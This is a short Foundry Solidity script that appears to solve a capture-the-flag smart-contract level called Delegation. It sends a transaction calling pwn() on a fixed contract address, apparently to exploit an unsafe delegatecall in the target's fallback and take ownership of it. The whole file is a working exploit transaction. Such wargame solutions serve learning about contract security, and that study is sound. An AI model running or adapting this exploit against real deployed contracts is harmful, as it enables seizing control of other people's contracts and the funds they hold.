// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Delegation} from "../src/Delegation.sol";

contract DelegationScript is Script {
    Delegation public delegation;

    function run() public {

        delegation = Delegation(0x611C5bf1c93108660848e97745a140F88e9aF29C);

        vm.startBroadcast();
        
        (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "Failed to attack");

        vm.stopBroadcast();
    }
}
